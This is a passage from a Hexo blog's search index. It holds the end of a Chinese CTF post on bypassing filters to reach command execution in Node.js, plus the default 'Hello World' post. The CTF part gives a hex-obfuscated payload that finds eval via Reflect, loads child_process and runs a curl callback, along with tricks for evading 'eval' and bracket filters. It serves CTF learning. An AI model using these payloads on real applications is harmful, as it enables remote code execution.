function_">ownKeys</span>(<span class="variable language_">global</span>).<span class="title function_">find</span>(<span class="function"><span class="params">x</span>=&gt;</span>x.<span class="title function_">includes</span>(<span class="string">&#x27;eval&#x27;</span>))](<span class="string">&#x27;\x67\x6c\x6f\x62\x61\x6c\x5b\x52\x65\x66\x6c\x65\x63\x74\x2e\x6f\x77\x6e\x4b\x65\x79\x73\x28\x67\x6c\x6f\x62\x61\x6c\x29\x2e\x66\x69\x6e\x64\x28\x78\x3d\x3e\x78\x2e\x69\x6e\x63\x6c\x75\x64\x65\x73\x28\x27\x65\x76\x61\x6c\x27\x29\x29\x5d\x28\x27\x67\x6c\x6f\x62\x61\x6c\x2e\x70\x72\x6f\x63\x65\x73\x73\x2e\x6d\x61\x69\x6e\x4d\x6f\x64\x75\x6c\x65\x2e\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72\x2e\x5f\x6c\x6f\x61\x64\x28\x22\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73\x22\x29\x2e\x65\x78\x65\x63\x53\x79\x6e\x63\x28\x22\x63\x75\x72\x6c\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x31\x32\x33\x34\x22\x29\x27\x29&#x27;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>这里还有个小trick，如果过滤了<code>eval</code>关键字，可以用<code>includes(&#39;eva&#39;)</code>来搜索<code>eval</code>函数，也可以用<code>startswith(&#39;eva&#39;)</code>来搜索</p></blockquote><h4 id="过滤中括号的情况"><a href="#过滤中括号的情况" class="headerlink" title="过滤中括号的情况"></a>过滤中括号的情况</h4><p>在<code>3.2</code>中，获取到eval的方式是通过<code>global</code>数组，其中用到了中括号<code>[]</code>，假如中括号被过滤，可以用<code>Reflect.get</code>来绕</p><blockquote><p><code>Reflect.get(target, propertyKey[, receiver])</code>的作用是获取对象身上某个属性的值，类似于<code>target[name]</code>。</p></blockquote><p>所以取eval函数的方式可以变成</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Reflect</span>.<span class="title function_">get</span>(<span class="variable language_">global</span>, <span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(<span class="variable language_">global</span>).<span class="title function_">find</span>(<span class="function"><span class="params">x</span>=&gt;</span>x.<span class="title function_">includes</span>(<span class="string">&#x27;eva&#x27;</span>)))</span><br></pre></td></tr></table></figure><p>后面拼接上命令执行的payload即可。</p>]]></content>
      
      
      <categories>
          
          <category> CTF 进阶 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/03/28/hello-world/"/>
      <url>/2024/03/28/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
